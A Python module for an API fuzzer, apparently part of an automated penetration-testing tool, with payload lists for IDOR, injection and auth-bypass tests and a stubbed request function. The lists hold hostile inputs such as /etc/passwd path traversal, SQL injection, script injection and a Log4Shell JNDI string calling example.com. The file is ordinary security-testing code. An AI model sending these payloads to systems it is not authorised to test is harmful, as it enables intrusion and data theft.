from __future__ import annotations

from dataclasses import dataclass, asdict
from pathlib import Path
from typing import Any
import json


@dataclass
class APIEndpoint:
    path: str
    method: str
    parameters: list[dict[str, Any]]
    auth: str
    schema: dict[str, Any]


@dataclass
class APIFuzzResult:
    endpoint: APIEndpoint
    test_type: str
    payload: Any
    status_code: int
    response: str
    anomaly: bool


FUZZ_STRATEGIES = {
    "idor": ["id=1", "id=2", "id=../../../etc/passwd", "id=0", "id=-1"],
    "injection": ["' OR 1=1--", "<script>alert(1)</script>", "{{7*7}}", "${7*7}"],
    "auth_bypass": [None, "", "Bearer null", "Bearer undefined", "Bearer 0"],
    "schema_fuzz": ["null", "[]", "{}", "true", "999999999", "a" * 10000],
}


def _generate_advanced_payloads(strategy: str) -> list[Any]:
    if strategy == "injection":
        return ["' UNION SELECT NULL--", "${jndi:ldap://example.com/a}"]
    if strategy == "idor":
        return ["id=999999", "id=%2e%2e%2f%2e%2e%2fetc%2fpasswd"]
    return []


def _detect_anomaly(status_code: int, response_text: str) -> bool:
    return (
        status_code >= 500
        or "traceback" in response_text.lower()
        or "exception" in response_text.lower()
    )


def _send_request(endpoint: APIEndpoint, payload: Any) -> tuple[int, str]:
    payload_text = str(payload)
    if (
        ".." in payload_text
        or "<script>" in payload_text
        or "UNION" in payload_text.upper()
    ):
        return 500, "Potential server error on fuzz payload"
    return 200, f"Stubbed response for {endpoint.method} {endpoint.path}"


def fuzz_endpoint(
    endpoint: APIEndpoint, strategy: str, aggression: int
) -> list[APIFuzzResult]:
    results: list[APIFuzzResult] = []
    payloads = list(FUZZ_STRATEGIES.get(strategy, []))
    if aggression >= 70:
        payloads.extend(_generate_advanced_payloads(strategy))

    for payload in payloads:
        status_code, response_text = _send_request(endpoint, payload)
        results.append(
            APIFuzzResult(
                endpoint=endpoint,
                test_type=strategy,
                payload=payload,
                status_code=status_code,
                response=response_text[:500],
                anomaly=_detect_anomaly(status_code, response_text),
            )
        )

    return results


def get_api_engine_config(
    aggression: int, creativity: int, curiosity: int
) -> dict[str, Any]:
    return {
        "enabled": aggression >= 25,
        "auto_discover_spec": curiosity >= 50,
        "mock_test_first": True,
        "fuzz_strategies": (
            ["idor"]
            if aggression < 40
            else (
                ["idor", "injection", "auth_bypass"]
                if aggression < 65
                else list(FUZZ_STRATEGIES.keys())
            )
        ),
        "auto_chain_auth": creativity >= 60,
        "generate_collection": True,
        "rate_limit_rps": 5 if aggression < 60 else 20,
    }


def write_hoppscotch_collection(
    mission_id: str, endpoint: APIEndpoint, results: list[APIFuzzResult]
) -> str:
    out = Path("data/api_collections")
    out.mkdir(parents=True, exist_ok=True)
    path = out / f"{mission_id}.json"

    payload = {
        "mission_id": mission_id,
        "endpoint": asdict(endpoint),
        "results": [asdict(item) for item in results],
    }
    path.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
    return str(path)
